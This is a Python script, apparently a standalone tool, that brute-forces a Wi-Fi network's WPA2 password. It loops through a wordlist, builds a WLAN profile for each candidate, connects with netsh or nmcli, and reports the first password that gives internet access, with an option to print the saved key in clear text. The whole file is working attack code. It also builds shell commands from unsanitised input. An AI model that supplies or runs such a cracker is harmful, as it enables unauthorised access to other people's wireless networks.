import os
import platform
import time
import requests

# URL kiểm tra kết nối Internet
URL = "https://youtube.com"
TIMEOUT = 5

def create_new_connection(name, SSID, key):
    config = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{name}</name>
    <SSIDConfig>
        <SSID>
            <name>{SSID}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{key}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
    try:
        if platform.system() == "Windows":
            profile_path = f"{name}.xml"
            with open(profile_path, "w") as file:
                file.write(config)
            os.system(f"netsh wlan add profile filename=\"{profile_path}\" interface=Wi-Fi")
            os.remove(profile_path)
        elif platform.system() == "Linux":
            os.system(f"nmcli dev wifi connect '{SSID}' password '{key}'")
    except Exception as e:
        print(f"[ERROR] Failed to create connection profile: {e}")

def connect_to_network(name, SSID):
    try:
        os.system(f"netsh wlan connect name=\"{name}\" ssid=\"{SSID}\" interface=Wi-Fi")
        time.sleep(3)
    except Exception as e:
        print(f"[ERROR] Failed to connect to network: {e}")

def display_available_networks():
    try:
        os.system("netsh wlan show networks interface=Wi-Fi")
    except Exception as e:
        print(f"[ERROR] Failed to display available networks: {e}")

def is_connected():
    try:
        requests.get(URL, timeout=TIMEOUT)
        return True
    except (requests.ConnectionError, requests.Timeout):
        return False

def main():
    print("[INFO] Checking Internet connection...")
    if is_connected():
        print("[-] Please disconnect your internet for this operation to work.")
        return

    print("[INFO] Loading program...")
    time.sleep(1)
    display_available_networks()
    
    wifi_name = input("Enter the Wi-Fi name (SSID): ")
    password_file = input("Enter the path to the password file: ")

    try:
        with open(password_file, "r", encoding="utf-8", errors="ignore") as file:
            for line in file:
                password = line.strip()
                if password:
                    print(f"[INFO] Trying password: {password}")
                    create_new_connection(wifi_name, wifi_name, password)
                    connect_to_network(wifi_name, wifi_name)

                    if is_connected():
                        print(f"[SUCCESS] Connected to {wifi_name} with password: {password}")
                        choice = input(f"[?] Do you want to display Wi-Fi details (y/N)? ")
                        if choice.lower() == "y":
                            os.system(f"netsh wlan show profile name=\"{wifi_name}\" key=clear")
                        return
                    else:
                        print(f"[FAILED] Password '{password}' did not work.")
        print("[INFO] Exhausted all passwords. Operation complete.")
    except FileNotFoundError:
        print("[ERROR] Password file not found.")
    except Exception as e:
        print(f"[ERROR] An error occurred: {e}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[EXIT] Program terminated by user.")
